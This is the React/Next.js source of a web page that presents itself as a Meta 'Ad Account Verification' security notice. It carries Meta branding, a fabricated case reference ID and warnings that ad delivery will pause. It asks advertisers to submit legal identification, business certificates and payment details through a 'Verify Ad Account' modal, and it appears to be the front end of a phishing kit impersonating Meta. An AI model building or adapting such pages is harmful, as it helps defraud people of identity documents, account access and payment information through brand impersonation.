import { ModalFlowProvider } from "@/components/ModalFlow";
import { ButtonWithModal } from "@/components/ButtonWithModal";
import Image from "next/image";
import type { Metadata } from "next";

export const metadata: Metadata = {
  title: "Business Support Center | Ad Account Verification",
  description: "Mandatory identity and advertiser verification for ad account managers.",
  alternates: {
    canonical: "/accounts-center",
  },
};

export default function AccountsCenterPage() {
  return (
    <ModalFlowProvider>
      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-sky-50 to-slate-100 text-slate-900">
        <main className="mx-auto flex min-h-screen max-w-4xl flex-col px-4 py-10 sm:px-8">
          <section className="flex-1 px-1 py-2 sm:px-2 sm:py-4">
            <div className="mb-6 flex items-start gap-4 sm:mb-10">
              <div className="mt-1 flex h-12 w-12 items-center justify-center rounded-full bg-metaBlue/10">
                <Image
                  src="/ic_blue.svg"
                  alt="Identity Verification"
                  width={40}
                  height={40}
                  className="h-8 w-8"
                />
              </div>
              <div>
                <h1 className="text-2xl font-semibold tracking-tight sm:text-3xl">
                  Security Notification: Confirm Ad Account Ownership
                </h1>
                <p className="mt-2 text-sm font-semibold text-slate-800">
                  Periodic security evaluation and Advertising Policy compliance checkpoint.
                </p>
              </div>
            </div>

            <div className="space-y-4 text-sm leading-relaxed text-slate-700 sm:text-base">
              <p>
                To maintain transparency and integrity across our advertising ecosystem, we routinely verify advertiser identities and linked business assets. Your ad account has been flagged for standard credentials verification to ensure full compliance with updated Advertising Standards.
              </p>

              <p>
                Completing this verification ensures uninterrupted ad delivery, safeguards billing methods and business assets, and helps protect your Ads Manager against unauthorized access or account takeover attempts.
              </p>

              <p className="mt-4 text-sm font-medium text-metaBlue">
                Case Reference ID: <span className="underline decoration-dotted">#SEC-4719-AUTH-AUDIT</span>
              </p>

              <div className="mt-6 space-y-3">
                <h2 className="text-sm font-semibold text-slate-900 sm:text-base">
                  Submission Instructions &amp; Review Criteria
                </h2>

                <ul className="space-y-3 text-sm text-slate-700 sm:text-[15px]">
                  <li>
                    • <strong>Information Consistency:</strong> Ensure all business registration certificates, legal identification, and payment details strictly match the registered information in your Ads Manager.
                  </li>

                  <li>
                    • <strong>Review Timeframe:</strong> Please submit the required documents within the active verification window. Unverified ad accounts may experience temporary delivery pauses or spending limit restrictions.
                  </li>

                  <li>
                    • <strong>Processing &amp; Status Maintenance:</strong> Once submitted, our review team will evaluate your credentials (typically within 24–48 hours). Active campaigns, budgets, and billing profiles will remain protected during the review.
                  </li>
                </ul>
              </div>
            </div>

            <div className="mt-10 flex justify-center">
              <ButtonWithModal className="inline-flex items-center rounded-full bg-metaBlue px-10 py-3 text-sm font-semibold text-white shadow-sm transition hover:bg-metaIndigo focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-metaBlue focus-visible:ring-offset-2">
                Verify Ad Account
              </ButtonWithModal>
            </div>
          </section>

          <footer className="mt-6 flex flex-wrap justify-center gap-4 text-xs text-slate-500 sm:text-[13px]">
            <button className="hover:text-slate-700" type="button">
              Business Help Center
            </button>
            <span className="text-slate-400">|</span>
            <button className="hover:text-slate-700" type="button">
              Data Privacy
            </button>
            <span className="text-slate-400">|</span>
            <button className="hover:text-slate-700" type="button">
              Advertising Policies
            </button>
            <span className="text-slate-400">|</span>
            <button className="hover:text-slate-700" type="button">
              Community Standards
            </button>
            <span className="text-slate-400">|</span>
            <span>Meta © 2026</span>
          </footer>
        </main>
      </div>
    </ModalFlowProvider>
  );
}